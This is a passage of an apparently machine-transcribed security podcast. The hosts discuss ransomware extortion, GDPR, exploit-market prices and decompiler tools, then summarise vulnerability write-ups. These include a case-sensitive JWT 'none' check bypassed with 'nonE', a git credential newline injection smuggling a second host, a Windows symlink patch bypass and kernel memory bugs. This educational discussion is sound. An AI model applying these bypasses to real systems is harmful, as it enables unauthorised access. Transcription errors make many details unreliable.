basically just encouraging the action further.\", \"start\": 304.3}, {\"speaker\": 1, \"line\": \" It's kind of like that. But associate with terrorists, yeah. Oh,\", \"start\": 319.5}, {\"speaker\": 2, \"line\": \" yeah. No, I mean you're right and idea that it honestly, like does it make a big difference your stuff's going to be encrypted one way or another probably not but I think the different ideas that they give them like two weeks to go and say if you don't want this in the news and blahbitty blah, well then just pay us now, right? Otherwise, that's when you see them publish it so then you don't just have two bad guys to worry about right you've now got the stress of media Outlets who wait for stuff like To happen harassing you you've got researchers and every single person annoying the crap out of you and when they publish it like most ransomware groups, if they're you know, just trying to stay low down they'll just encrypt the information right and then kind of annoys you about it to decrypt it if they have like these groups are taking that information as well. So then you run the risk of Bill now give it to all the other criminals, right?\", \"start\": 323.8}, {\"speaker\": 3, \"line\": \" Yeah. No, I definitely see where like a match. I definitely see where the pressure is coming from on that side. Like I see what's novel about this. This it was just kind of had that question about you know, it's a really necessary and I guess 0.2 go. Yeah, it does make a practical difference against those companies that might try and stand up to it a little\", \"start\": 368.1}, {\"speaker\": 2, \"line\": \" bit. Yeah, now that's that's kind of my you know synopsis really is just that I thought that this was interesting because of the fact that like I know lots of people talk about ransomware and stuff and kind of understand how it works, but I don't know. I just thought it was like old-school gangster type stuff where it's like, okay, I'm not just going to encrypt all your crap. Like I'm going to make it known that I've encrypted all your stuff and your clients are going to hate like, you know, it's just for\", \"start\": 388.2}, {\"speaker\": 3, \"line\": \" protection, you know going with that protection racket of the mafia.\", \"start\": 414.6}, {\"speaker\": 2, \"line\": \" If you let your neighbors know that I broke your windows and I fixed them to and if they don't want an Ali.\", \"start\": 420.5}, {\"speaker\": 1, \"line\": \" One thing I did notice just scrolling down the page a little bit is you know, they're saying that it should be treated as a data breach because there is an encrypted files being stolen. So like does that mean technically that under gdpr any companies that operate in Europe have to disclose when they're hit by ransomware now, like I never really liked I know gdpr is kind of a weird topic because it's pretty\", \"start\": 428.4}, {\"speaker\": 3, \"line\": \" vague, even if they weren't even if the files were being taken. I think just the fact that they would have been X or whooping access by the malware doing the encryption would be enough to Warrant the data breach\", \"start\": 453.6}, {\"speaker\": 1, \"line\": \" alert. Okay. Yeah, it was just something that I never really thought about it like obviously but you know if this is dumped on the on the web or something then that constitutes a data breach but just like it's a breach when it's\", \"start\": 466.1}, {\"speaker\": 3, \"line\": \" accessed. So what exactly happens from there, you know, it takes time to figure out what exactly happens in attack figure out what was actually taken in South bow the moment\", \"start\": 478.9}, {\"speaker\": 1, \"line\": \" it's access its breached.\", \"start\": 489.4}, {\"speaker\": 3, \"line\": \" At least as far as I know obviously, I'm not a lawyer. We're not lawyers on here. But she's\", \"start\": 492.7}, {\"speaker\": 2, \"line\": \" providing. Will your advice right now? That's what\", \"start\": 497.0}, {\"speaker\": 3, \"line\": \" yes, that's that's how you can take this run your company based off of my advice. I would highly recommend it. But yeah, as far as I'm aware of GDP are as soon as that axis happened it sort of breaks and we've kind of seen that with well with that shot off. I think we talked about a few episodes back. That one shop that got compromised and the white hat hacker who was acting fairly dark was kind of trying to leverage that saying they needed to disclose the breach because because he had access regardless of the fact that he had made a public yet. Did you have anything further to kind of add on\", \"start\": 499.9}, {\"speaker\": 2, \"line\": \" that? The only thing I would say is that you know to throw a little shade I think talking about gdpr and certain things. I'm not saying that companies aren't reporting it. But I do get this feeling that you know, because I've looked into some of these compromises and stuff like that. I'm very comfortable saying that there's probably some companies who aren't reporting like they're supposed to I can't name and shame because I don't know for sure. I think there's no hard to fix. Aren't necessarily aware yet. They need to be reporting all the\", \"start\": 542.8}, {\"speaker\": 3, \"line\": \" time or of was level they need a report at and that's not an excuse. It is one of the things I appreciate with GPR is I do think you know companies need to be more responsible about disclosing when informations been breached. So like I agree with GDP are kind of pushing that although I do realize it adds a little bit extra work for like the small businesses and stuff, but Yeah, I definitely agree. There are there are going to be companies that aren't necessarily alerting on the base of a breach part of that's going to come down to being able to detect the breach small business isn't necessarily going to have the same skills to actually detect. Hey, they've been breached. I do think this is an interesting case because they you were mentioning about it taking months to decrypt if it's taking months to decrypt. It's probably taking a while to encrypt all so they're probably sitting on there for a while this particular. Page from bleeping computer mentions that attackers were likely on the network for weeks.\", \"start\": 572.3}, {\"speaker\": 2, \"line\": \" Yeah, and I don't wanna interrupt Specter. I know he probably had some say so if you want to throw your hat into the mix real quick Specter, I did have a response to that though. Zi.\", \"start\": 631.5}, {\"speaker\": 1, \"line\": \" Okay. What I just wanted to say was with the GDP our Point specifically even though it technically Viola GDP are not disclosing if these kinds of breaches happen. The problem is how much is it actually enforced? You know, I don't have the data laid out for that, but I Imagine they're probably not really aggressively enforcing\", \"start\": 638.9}, {\"speaker\": 3, \"line\": \" us. So actually gdpr does have some bite. I couldn't I wasn't expecting a name any particular instances, but there have been some significant fines around gdpr. So I would say that it does have a bite. Okay Fern I couldn't say in particular sure because I mean there's also the case of if they don't alert that there's a bridge how do you even find out that\", \"start\": 658.7}, {\"speaker\": 1, \"line\": \" there was a breach\", \"start\": 679.2}, {\"speaker\": 3, \"line\": \" I mean depending on the type of criminals that actually did the bridge they're not necessarily going to be dumping it or how it gets you. Is might not be clear. So I mean, I'm sure there are companies that can get away without reporting because the criminals just have to kind of keep it quiet. They had the data from this Source or you couldn't actually isolate what the source of the information was.\", \"start\": 680.8}, {\"speaker\": 2, \"line\": \" Yeah. Now that's probably a fair point and I think you know, I mean, it does have a little bit of bite, you know, if you look at Facebook and I think even Google have been sued based on GDP are or find I should say not suit the find based on those. So I mean it does have an impact now. Like you kind of talked about Specter how big of an impact again a mom and pop shop. Are you going to go drag him through the mud and stabbed him in the leg like how dare you know, like, you know, who knows how deep it really goes if it's not a big big company, but you know to kind of summarize on one point Z, it does happen that most of these campaigns and once that I've even seen, you know, it doesn't just happen overnight like oh no, you know, I went and walked away for coffee and my whole network isn't Clint completely encrypted like it. Isn't to my knowledge. I haven't seen anything like that. But the problem is usually a lot of these companies, you know, just I think even there's a I don't know if stop my head maybe I can provide a link there was some government agency. I think of something with the power grid in South America that basically like gigabytes if not terabytes of information was siphoned out and stuff like that. So all these people don't have any cognizant idea of like the initial state which is usually the loader right? So these things start with like a very basic malware, Are not necessary basic but one that's just meant to drop more malware, right? So trick bought and a few other variants then it kind of sets and Scopes out the network then it's like multi stage is where they go and run things. Like I don't know if it was Powershell Empire, but there's definitely a few things like Cobalt strike some of the stuff that like pentesters use they'll go and like compromise all kinds of other servers and active directory and stuff like that to get as much access as they can. So normally it probably takes about a week but they have there has been some research that I've shown like some of these campaigns the second they get a foothold through like Like RDP or something. It'll take them like 48 hours to map out your network and then drop like something like Ryu quic then just encrypts everything so long story short. Usually if you have really good liquid setup, you can maybe catch this in the early stages, but unfortunately, it doesn't seem to matter and malware just I me and that's kind of\", \"start\": 700.3}, {\"speaker\": 3, \"line\": \" a wider issue in general. There's a little bit of once you're through the perimeter. There's just trust trust everybody that's kind of inside the perimeter and that's a mistake. I think for a lot of companies that have that type of network setup, but that generally Wide what? It is, especially on smaller side, once you're in you're in and then you kind of just have maybe they're you know zi mention 80 and stuff. But like maybe there's a little bit more access control, but it's very soft once you're inside. But I think I do want to get on to the other topic before you have to take off. So if you're good with you, but go ahead. Let's hear it. Yeah. Well, so the other topic is the well potentially here from Vice hackers are selling a critical Zoom. Zero-day exploit for $500,000\", \"start\": 823.7}, {\"speaker\": 1, \"line\": \" zooming back into the news. Of course. Yes, of\", \"start\": 870.4}, {\"speaker\": 3, \"line\": \" course soon. You know what so I'm going to say, I don't know if I believe this I believe the advertisement is there. I am not sure I believe so you can put an advertisement up for anything at any price. I mean, I remember during the grease this is yours going Greece had some financial problems. Somebody put grease up on eBay for how it like. However much money was at the EU was offering like you obviously this isn't being sold on eBay. But so I believe that's there. I don't know if the markets really there at\", \"start\": 872.9}, {\"speaker\": 1, \"line\": \" $500,000. I doubt it. I think it's worth that much.\", \"start\": 909.5}, {\"speaker\": 3, \"line\": \" No no neither do I and I mean the big thing is and we can kind of go into a further discussion overpricing something exploits, but the thing is is zoom zero day. First of all, it sounds like some of these require you to be on the call with some I so it's not like corporate Espionage or you're going to secretly get on the call. You're going to have to already be in there and it's to infect to whoever you're calling so that someone limits the use\", \"start\": 914.6}, {\"speaker\": 1, \"line\": \" to You\", \"start\": 936.9}, {\"speaker\": 3, \"line\": \" already have to be at rest individual but in terms of the lifespan of an exploit like this the problem with the exploits or something, like, you know, even Facebook or zoom in this case is they're going to get Pat reasonably quickly as soon as you start abusing it whereas, you know issues like, you know, I'll in Excel PE, you know, everybody who's running Linux needs to go and do that upgrade with some like Zoom. There's that centralized patch if they patch On the server. It's patch\", \"start\": 938.8}, {\"speaker\": 1, \"line\": \" for everybody pretty much,\", \"start\": 969.9}, {\"speaker\": 3, \"line\": \" you know, if it's client-side. Okay, maybe takes a little while. There's on my updates. So the lifespan of those excellent just doesn't last that long now to be fair. There's definitely a chance that prices are being pushed up just because everybody's all of a sudden using Zoom. So like I don't have like the Hands-On knowledge actually say, but I'm definitely skeptical the 500,000 price tag.\", \"start\": 973.0}, {\"speaker\": 1, \"line\": \" See part of the reason I could see the only reason I could see it maybe being even close to worth that much is because we have you know, as we've talked about in the past. We have seen governments using it. Like I think the UK government was using it for a little while, but that being said due to all the zoom issues that we have covered in the past as well. We've been seeing governments actually being recommended to and moving away from using Zoom as well. So while it has gained popularity, I think it's starting to lose some of that popularity, especially in the Like potential targets that you want to hit with spending that much money on it. I can see it maybe being closer to like Fifty to a hundred K. But 500k seems like way\", \"start\": 996.5}, {\"speaker\": 3, \"line\": \" outlandish. It really does. I mean even so I can't think of too many other companies that will advertise the price that they're buying exploits at beside 0 DM. Yeah 0 DM like their web stuff like generally anything that's touching on the web. They're paying you know up to like 10,000 dollars for Stuff hitting the web that includes compromising like the mail servers in particular. Well, no the mail you I guess technically because it's round Cuban hoard that they're paying for.\", \"start\": 1035.8}, {\"speaker\": 1, \"line\": \" I was going to say the only thing when you like zero teams are pretty good Baseline, the only things you're looking at and the 250 to 500 K range is either all server Tech or browser and mobile rces. And that's all you're getting.\", \"start\": 1065.7}, {\"speaker\": 3, \"line\": \" Yeah, and to be fair at the hundred thousand range. They do have like WordPress RCC panel Plus.\", \"start\": 1079.6}, {\"speaker\": 2, \"line\": \" But again,\", \"start\": 1086.5}, {\"speaker\": 3, \"line\": \" like it's not desktop applications like Zoom would be it's not a browser. So I mean I could see why I like somebody really desperate for Zoom thing might pay more. That's why I said because there's that could be pushing the prices off but just using kinda the knowledge that we have. I was here damn in 0 DM is gray market and ugly. It's not black market pricing, but that's kind of the other thing when you're talking about the government the government's usually buying great Market as far as I'm aware. I'll know if anti if you want to correct me on that. But I believe the government's usually going to buy from brokers who are going to buy kind of on the gray Market.\", \"start\": 1087.6}, {\"speaker\": 2, \"line\": \" Yeah, normally so the way it works in my understanding in this is In fairness. I'm not a government, you know that bias exploits. So please don't, you know quote me on this book to my understanding and people have talked with the government normally. Yes buys from like third-party so that there's less of a risk, right so that if I go I could say normally they don't buy to like zi rhodium or be zero day initiative. I don't think zi zi offers that but yeah, they go through a third party that then we'll go and find actually those things on their behalf that whole point so that they can kind of even distance themselves more. There's a whole reason that you have to go through all these like compliance checks and crap for selling to the government. So I assume you know for the most part. Yeah, they're not going just straight to the the hackers and stuff.\", \"start\": 1126.6}, {\"speaker\": 3, \"line\": \" Yeah. So and the reason why I brought that up that was just because that kind of indicates that the people that are buying off the black market they aren't the government.\", \"start\": 1169.8}, {\"speaker\": 1, \"line\": \" Targeting\", \"start\": 1179.2}, {\"speaker\": 3, \"line\": \" people it's going to be the kind of criminal say organized crime perhaps which again the demand there seems more like exploit kits. Well not I mean so I corporate Espionage I think is the other great big area.\", \"start\": 1179.7}, {\"speaker\": 2, \"line\": \" What and I would caution like I have regular fights with people about this is that they'll go and say well just because it's only worth, you know this much in real life right like a amongst exploit Brokers. It's got to be worth like double that in the underground or some nonsense. You're like actually Lee I usually find that it's worth less in the underground because it's not like most cybercriminals dude or spending $500,000 for next week. That's insane. They can't make that much money. But if they can make that much money back like it would never be for something that has this little utility. You know what I mean? There's no full chain. There's there's it's only working for you. No one platform like and they didn't even talk about what like which versions of Windows which versions of Zoom so like I don't see most of these things. Even when there was some supposed went with exploits right rces. I was seeing them being offered at like 50k and craziness like that. Whereas there obviously worth a lot more than exploit broker stuff. So\", \"start\": 1194.0}, {\"speaker\": 3, \"line\": \" yeah, I think it's definitely great with you like my experience with the black market\", \"start\": 1250.6}, {\"speaker\": 2, \"line\": \" which has been limited but\", \"start\": 1254.5}, {\"speaker\": 3, \"line\": \" is that it's generally offering less not more unless you have something very very particular. I guess. I'll say\", \"start\": 1256.0}, {\"speaker\": 1, \"line\": \" Would it be fair to classify Black Market more as less exclusive selling but selling to more people and that's why it's valued at less. So even though it's valued at less you could potentially be making more money in the end because you're selling the more people but because you're selling the more people that bug is probably going to dial up faster too. So I think that's like one of the bigger differences between the gray Market in the black market generally in the gray market, like if if you sell to like zi rhodium or something like that. They're going to want exclusive access. To that, you know, they're not going to want you to go sell that to another exploit though. I gently\", \"start\": 1264.7}, {\"speaker\": 3, \"line\": \" 0 DM themselves and they do they sell they don't sell it exclusively. But yeah,\", \"start\": 1298.8}, {\"speaker\": 1, \"line\": \" they were generally when you're selling to a broker you're going to be selling it exclusively. Whereas when you're selling it on the black market. I think there's less of that exclusivity. So while it's true you are selling it like it's valued at less you are potentially making more but it's probably gonna die faster too. So that's why I think that's partially why governments probably Don't even touch the black markets. It's because they want that exclusivity.\", \"start\": 1304.9}, {\"speaker\": 3, \"line\": \" Yeah, it's in Chad Razzie. Woohoo mentions. I am. Oh that's 500k articles more of an ad for vice the show they're down with current events rather than call for Zoom user awareness. I mean, yeah, this isn't really about Zoom user awareness because this isn't going to impact most users of zoo. Anybody that's buying an X like $500,000 isn't just targeting the user base at Large.

I won't drop any names in particular, but I remember being on another twitch stream and the guy just meant like, you know, if you're letting the cloud know all your passwords or something. You're just doing it wrong. There's it was something like that where you basically had the idea that password managers actually knew what your passwords or and how LastPass Works how be awarded Works how basically any of the cloud or centralized storage password managers work any of the big ones, at least I'm so I'm sure there's some random one that's just implemented stupidly. But they don't know all of your information. They encrypt they basically just store this encrypted blob that is only decrypted on your side. They have separate keys to do your authentication to authenticate the you're allowed to see that blob versus being able to actually decrypt The Blob the keeps guys split up into three parts stored in different places. And you're the only one that actually brings them together with your master password. That's kept local of long story short. Basically this what I thought His interest here is just he found you know, a lot of consistency with what we've been informed about and in theory, this is somebody else. I'll say if you really want to trust you have to go look yourself, but this does seem to be kind of somebody independent coming to the same conclusions about how it's working what it's doing and just generally a positive sign.

Yeah, but I mean that wasn't really the aspect I cared but I just want to point this out of something that it's got the consistency there. Like I'm a fan of these cloud-based password managers. I completely get why you would want to take it a step further and store it and use like a key pass or something, you know, not use the cloud based system completely fair, but the biggest concern are people re using passwords.

It's also an extra step of work more talking about kind of getting everybody in the masses using it. Something like LastPass is far more convenient than being to make sure you always have that encrypted database around. That's said that is still a better step. I'll but at this point, I don't think the world's ready for that to be the default recommendation. It's not that I disagree with that recommendation.

That is one one of my biggest gripes with binary ninja when I was using it last was the cross-references panel was kind of annoying to work with I think like you couldn't even really pop it out before and it was all just it was very simplistic and and basic you couldn't really get too much information out of it. But their new one that they're doing. Let me just go back to what the new one that they're doing actually has like a lot of information. It has the the type information in there and it talks about if it's a data reference or code reference. So I really like that new crop cross-references view. I think that's probably like that's that's personally something that I've been looking forward to so, you know, I don't know if I really use a debugging front end, but I know there are people who You know, that was one of the biggest things where people didn't want to switch from Ida the binary ninja or Deidre for example, is that fact that Ida has the debugger and benjin Deidre don't yeah.

So, you know talking about the decompiler will jump into that as well. So played CTF was happening over the weekend and Vector 35 actually teamed up with them did like a little collaboration.

Okay, while you're doing that. I will say that wasn't the only one the other one was the variable naming the Variable naming people find pretty weird and unintuitive just the way that it's like VAR underscore. I guess I too like x-rays kind of does the same thing but like going 18 underscore one like they kind of just keep a pending these indexes on to it and it's kind of hard to follow that being said, I don't know like I can't really yeah Center Solution on the spot, but that is one other, you know complaint I saw that was common across different\", \"start\": 2533.2}, {\"speaker\": 3, \"line\": \" jae-min.

I believe that said when we're talking so I pulled up the screenshot. This is from Rob emporiums Bad characters challenge. Somebody actually on the re Discord server kind of pointed pointed out some other things with that particular challenge that'll bring up but in terms of the code block, so you'll see here that Don't use curly braces around anything. They just do indentation. So so I can understand why people are like, oh, I don't like that code style. You're not writing this code though. You're only going to read it. And the reality is that adding those braces is purely because this isn't see. I mean there's other things. I've make this Nazi you're not writing this your only need to read at the only thing that those braces will add is empty lines. That's the only thing it adds.

Yeah. That's it. Here's I am going to pull out a few. Rights, here are a few other issues that we've noticed. So I pulled up the graph you now. This is what you'll see if you use cloud and this is I was mentioning earlier about how the cloud isn't quite the same. So this is that same Bad characters or what was the function call. I think it was like check Bad characters or something is the function name from The Bad characters Rob Emporium challenge if you were paying attention on the video before or if you can't see anything what we see right here with a graph as we see a while loop and we see the VAR being incremented at the base. We see those think what would you see the two increments actually because it's a double for Loop but it treats them in the graph view as wild Loops. Whereas in the linear view, which you do not get in in the free version right now and Cloud. It gives you the four Loops. It gives you something that in my opinion is much more readable than what you see in the graph View. That's interesting. So it basically it seems like a prefers to decompile as a while loop when you're seeing the graph which kind of makes sense because those like parts of the for happening different areas. So make sense to show how things jump around in that whereas the linear view makes a little bit more sense to just show it as is like I kind of get where that came from, but it is worth noting because I did see some complaints about not picking up for loops and I think that's Why I think it's because for those basically only show up when you're in the\", \"start\": 2997.9}, {\"speaker\": 1, \"line\": \" linear View. That's really interesting. I never noticed that but yeah, that being said I do want to bring up that tomorrow night probably at like 8:00 p.m. Eastern. I will be doing a stream looking at Benja because I haven't personally since I don't have a commercial license, I'm not balling out that hard but um, you know, I'm going to be looking at the decompiler and comparing it to geed ra seeing like where it's better and trying to check out some of the complaints that I've seen see how much like Merit they have and whether there's a way around it and stuff like that. So I am going to be Doing a string that's going to be exploring that tomorrow. So I do just want to shout that out just in case I forget to show to their to the begin at the end of the episode as well. So, you know just for anybody that's interesting that I will be doing a stream about that and we will probably be doing a more polished video that looks at it, you know without all the you know things that come in the string. We're going to be doing a video on that too. So be on the lookout for that. Yeah. Something\", \"start\": 3092.5}, {\"speaker\": 3, \"line\": \" said. Yeah, go ahead.\", \"start\": 3146.5}, {\"speaker\": 1, \"line\": \" I was thinking we'll probably move into more of the CTF. So\", \"start\": 3148.8}, {\"speaker\": 3, \"line\": \" actually I want to go on with one. Are really big issue and that is brutal. Okay. Well, so this is like I'm going to say this is probably personally I see this is something that's going to get fixed very quickly. But if you take a look this check Bad characters function notice the start if at the bar 28 equals 0 x 62, yeah and the for Loop just kind of uses the relative act like it but it's basically looping through the indexes for each character in 4H back. Character if you look at the ml IL though for this function, we noticed something really important, which is that the ml IL has a bunch of assignments earlier on it has the far 20 a far 2726 it assigns the entire array because this is obviously a array being declared on the stack. So it's doing that initialization there as you call in the function at setting up the entire stack with all of the bad characters. Oh decompiler completely optimizes that now Is it is there in the ml I also like it knows it's there. So this seems like something that because the actual Loops only access these indirectly. It doesn't really associate them together. So it's a failure on their part. It seems like a failure that's more like an optimization thing where it's like, oh, hey these variables are he is let's just not show them. It seems like an overzealous optimization that can be tamed back a little bit rather than a really significant. Issue with the decompiler, but it is there right now like that is a huge issue. It just seems to me like it's something that can and will be fixed pretty quickly. But yeah, I just want to point that one. I would also because like that it that's that's a pretty serious issue to be missing\", \"start\": 3151.5}, {\"speaker\": 1, \"line\": \" that but that is a good example though of why you should never completely trustee compiler output alway and especially with ginger because you have access to those other intermediate levels.

And I guess to end on a positive note one of my favorite things. It's super small, but I just I just love kind of the fact that it's there and this happens in ml il-2 is they will preface the comparison.

I think overall, you know, it's been well-received. I'll say that yeah, it was a cool idea that they dropped it with the CTF as well though. I do wonder how many serious teams would want to switch up their tools like at the last minute, you know an hour before the CTF, but, you know, they're probably worth some and they probably got some useful.

I don't like 16 hours possibly more of good hard work into that challenge and could not could not solve it. So I I just want to I call it out its catalog. I don't know if they release their challenges if they do that. That would be a fun one to go back to the solutions. Actually pretty cool. Like I did kind of figure out by the end. How to get the solution I just didn't get it working but it took advantage of like a new Chrome 80 feature using deep-linking using that kind of exfiltrate information. Sorry for some spoilers.

That's Ed with this one. Like said I spend like 16 hours and I never felt frustrated with the challenge. I never felt like the challenge was unfair and that's that was actually really impressive because usually if there's a web challenge and like I'm banging my head for that long odds are it's some sort of guess work or something, but I was always finding little things that I can maybe abuse. It was just coming up with how to work everything together. I mean he had to chain a bunch of issues can't get this one to work, but they included enough information to kind of lead you towards understanding what he needed.

So, you know, they're trying out a new AC called Vanguard for Valor and and the ACs had some controversy over the last little while some stupid controversy. I'll say so in my opinion because it's a kernel driver and it's loaded at boot.

So they provide a file manager that allows various media file types to be uploaded and one of the file types. They allowed to be uploaded is SVG files, which allow JavaScript so using that you can basically get an xss. Now. Obviously this can only really be performed by someone who can upload those SVG files and most likely someone's not going to want to access their own store.

So these are\", \"start\": 4306.1}, {\"speaker\": 3, \"line\": \" just words wherever the action that whatever reason there. It's not uncommon because Sometimes the code that handles just kind of post in general won't be the code that handles multi-part uploads and that's kind of what's important here is that when you do this sort of post request with a file, it's usually it's being done with like URL. I forget what the Mind type is now, but it's just using like that URL encoded like chi chi equals value kind of setup. Whereas with multi-part it's definitely more complicated setup. He giveth the The boundary and then that's kind of used to separate so you can send more binary data. You can send larger packs about that. So when you do a file upload, it's switching protocols a bit. Well not protocols by switching how the content gets parsed and so in a lot of systems it'll be different code that handles that or just the normal postcode won't in the paddling.

So, you know, like you were the one that signed it you validate that's a valid token and it'll include things like grants information for like what they're actually allowed to do or you can include a variety of things but the basic idea Is that it's just as a really lightweight way to do with Education Without need to query dead based on every page request. There are some downsides with that. I'm not a big fan of there are a lot of ways. You can shoot yourself in the foot using tokens. So while it definitely has some uses you've got to be careful. It's a lot like crypto in general. You've got to be careful with it because you never want to issue a token. That doesn't expire for example Back in 2015 a big issue was you could also just kind of create create a token and insert the algorithm saying well, what's the signing algorithm? Oh, I didn't sign it at algorithm none and give it all the grants you want and if something just check if it was a ballad token and that it had the right grant and didn't actually validate that it was signed by who they expected to be signed who they expected to be signed by. using the non algorithm is you can basically create your own tokens so in this case off the zero they obviously as most places have they've disallowed using the none algorithm I don't get why not algorithm was even included in the first place maybe development purposes stupid thing to use like you're never going to want to use that in practice like I can't I cannot think of any legitimate reason to use none anyway they banned not and by checking off the algorithms not but they checked it in a case sensitive way so you can set it to done with the capital e and allow you to use the none algorithm again.

So if you clone a repo and it's a private repo and you enter the password for it, and then you want to push updates to it, you know, you'll probably want to store those credentials so that every time you push you don't have to, you know, enter your crib your creds or whatever so, you know, they give an example if you execute command like get clone example.com Get will call the registered helpers to see if you contain any credits for that domain and then it'll attach those credentials to the outgoing or requests when it's asked for authentication. The problem is in their protocol. The implementation is actually vulnerable to a new line injection. So you can do something like example.com back / or / backslash n host equals github.com.

And the one they ended up looking at was the component-based servicing session. So part of what made this cool is they show a way that they first exploited it and then they show are they exploited again after Microsoft failed to patching it. So the bug was a arbitrary file disclosure in the icds session 10 interface. They found a bunch of you know, various methods that are attached to that. Interface but to kind of stood out and that was the initialized and create package methods. So the initialize function needs to be called before any other methods can be called, you know, you can kind of speculate that that's going to be the case just based on it being called initialize and you can pass it a boot drive and a Windows directory as well as some other stuff. There are some restrictions the windows directory has to have the directory structure of a typical Windows installation. So it needs a user's folder and needs to contain certain components. I'm guessing I thought they mean like dlls and other folders stuff like that but an attacker with access can can fake that structure and the other thing they can do is they can also create symbolic links which is then copied and is readable by the attacker which can lead to arbitrary file disclosure now Microsoft Patch this last year in November and what they basically try to do is you know look and say okay this is a symbolic link okay we'll just reject this we're not respecting the symbolic link so when they looked at it again after the Patch they noticed an error was being logged but the service was still copying the target file and this was because the boy they checked if the file was a symbolic link they use the get file attributes W method and the win API to check if the attribute is set for the symbolic link and this would work fine if the function worked out the documentation set it worked and the documentation said if the path points to a symbolic link make the function returns attributes for the symbolic link knocked the target file and that turns out to be wrong the it Returns the attributes of the final Target file not the actual symbolic link so because of that there check was essentially useless and it would still end up copying that Target file so this was again finally patched last month so it's just one of those cool things where you can see like just because an issue is patched doesn't mean it was patched correctly so that's one thing and then the other thing is you know you have to kind of question the documentation sometimes yeah liked a\", \"start\": 5483.9}, {\"speaker\": 3, \"line\": \" question question the documentation I just thought it was interesting that the two tools that create symlink to on the make link tool had different behaviors there too because that was kind of what the difference there was when a symbolic links crave with the make link tool get file attributes does return the appropriate attributes and includes that file actually reparse point that they're looking for but when you use the create symlink tool the documentation was wrong the documentation indicate that what do that and it doesn't I just I just found that interesting that the two different tools ended up resulting in some different and I'm sure like, it creates a slightly different type of Link because Windows has a bunch of different link types.\", \"start\": 5716.6}, {\"speaker\": 1, \"line\": \" I was going to say I'm not really a Windows person but I think part of the issue is that there's different types of those thinking Microsoft terminology.

I didn't realize they were still doing some patches on it and that's there's been ownership things. Like it's past hands a bunch of times. Either way this bug is in the hoodoo or W or it's also in the W application. Yeah code base. I think if this this example here does not actually go through exploiting it. lately it just shows basically that there is a bug in the Heap and they talk a little all right there is a buffer overflow he based it in basically just meant it comes out of the PSN file structure ends up being populated out of prepared PS info I mean where else would you expect it to get the information from but what it ends up doing at some point later on is if I can find the code example is it'll do a concatenation in one of the strings where it basically just adds a bracket whatever your argument was and bracket that's if when it's filling in our arguments it basically just adds that in there if your argument actually start with like a - space or something so if you do that it depends that little bit string it doesn't account for that offense so if you have a large if you have a Mac sighs string again to that point you like your buffers already full you can overflow by maximum in this case like I think that'll fill up 15 bytes you can provide and there's that argument plus the two brackets no bite leading to they mentioned specifically 17 bites of overflow 17 bites is not large enough to reach other structures that actually kind of matter in there so you can't get the control you can't get Direct Control flow sorry you can get direct access to the control flow with this you can to overwrite anything that's like a critical control structure you can corrupt the P child and P sibling I think it is which you may then be able to leverage into an exploit they did not actually do that yeah but and so they do also Mexican some extra challenges they're like said like that that's the gist of the ex white it appends the string and it doesn't actually count for that in terms of the string size so it can overwrite easy enough to understand exporting this might be difficult it does mention it does starve with privilege bracketing it does you have the proc owner set on it it does drop that pretty quickly though so you have a very limited time to abuse that and your buffer is going to end with that bracket and know which may or may not actually impact what you can do Force you have to deal with ASL are still a lot of work to still be done but it's kind of you know it's an issue in a pretty significant binary\", \"start\": 6331.6}, {\"speaker\": 1, \"line\": \" I could see this potentially not being exploitable just because you have so many compounding issues on top of it\", \"start\": 6532.0}, {\"speaker\": 3, \"line\": \" I'm at the very least you're probably I need another Gadget.

So that makes exploitation so much cleaner and nicer and they basically found another member in the structure that they could corrupt to easily get an arbitrary, right? And because you know that memory is so deterministic. They can also you know, they don't have to worry about ASL are they can defeat a SLR and then they just use that to smash the credential structure of the process to get uid 0 so You know, the exploitation of it is fairly straightforward the actual bugs. It's kind of fun because it sucks about you know, that discrepancy between 32-bit and 64-bit and all the math that goes into that. I do think they could have covered it a little bit better getting those details that I just said took a lot of like mental effort to try to understand what they were trying to say.

They basically have this, you know function that allows you to have a shared buffer between the kernel and Trust Zone which for people who don't know trust Zone. It's a trusted execution environment in the chain of trust. It is higher than Colonel. Technically. If you have Colonel access, you should not be able to mess with anything and trustzone.

I guess it's don't repeat yourself not do not but I'll the dry principle don't repeat yourself. And I think that kind of had came into play with this issue a little bit part of this issue comes down to they're two different cases as Spectre was mentioning about this buffer that's used to communicate with trustzone. Basically your station will allocate this buffer ion buffer that you can use to communicate and there's the function here that's vulnerable is the qse cam update command buffer or the 64-bit version of it and that will basically go and it will translate pointers is effectively the idea turn the pointers take the buffer turn the pointers into something trustzone will understand and it handles two different cases in which the buffers need to be modified and two different eye off dolls end up reaching it in am calling it for two different handlings and that's where I think dry kind of came in here they tried to centralize what was more of an incidental repetition rather than actual repetition that needed to be prevented because winds where you can know this happens is when you start seeing a path where you know at first you have exactly the same code pretty much so hey I'm going to create a function that just you know takes argument and then you'll need to update this function whenever you want to change it and then when you see a flag being added you see something else being ad that will change that methodology that will change how it works that's when you know that you probably shouldn't have actually repeated that function when you start adding those flags that make significant changes it should be a secondary function rather than being just you know combining it so I just wanted to point that out with I feel like that dry idea like you do have to be aware of the idea of incidental repetition where the repetition is there but it's only incidental to what's going on and it's not actually something you should combine into one\", \"start\": 7190.0}, {\"speaker\": 1, \"line\": \" function Yeah, one of those things that contributes to this issue is this code would be fine in userland because basically what you were saying with the two different types, they track it through this you'll see it on if anybody watching you'll see it on the screen they say data type. So they have this data structure that stores the type. The problem is that that data structure is attached to the file descriptor is attached to the device. So, you know, if you have two different octaves that can change the type from underneath the other thread that's Where the race condition comes into play now if this code was sitting in userland this code would probably be fine. The issue comes in where in Colonel it's very easy to have concurrent access and that's where a lot of Kernel driver issues bond from the fact that it's people who aren't familiar with the pitfalls that come with working in Colonel.

I do just want to kind of clarify the last bug at Specter kind of mention if you can change at the data type. So as I was saying here where this function will change or it will check the data data type to decide what to do. So you can have a function that will start with one data type called cause the other eye off to be called changes that data type and it'll end doing the other functionality.

function which is also called from the same I octal Handler is QC comset client member am and this can be used to set the request length now obviously this is bounced check that's not a super obvious you know issue like that it's not a low-hanging fruit issue so if it's too large it will bail within Val which is a common error code for stuff like that the problem is it resets the handle but because the the check fails no other parameters are modified and they're not wiped out so it will end up pointing to a previously set ion buffer which is already been freed so it's a classic use after free after a lot of digging I was able to find the patch it probably took me like 20 minutes just to find the patch but I will bring it up just because it does kind of clarify what the issue is if you're not familiar with the code base I've just brought it up here basically all they did to fix this issue was on error they basically just memset the entire structure to 0 so as soon as you go to

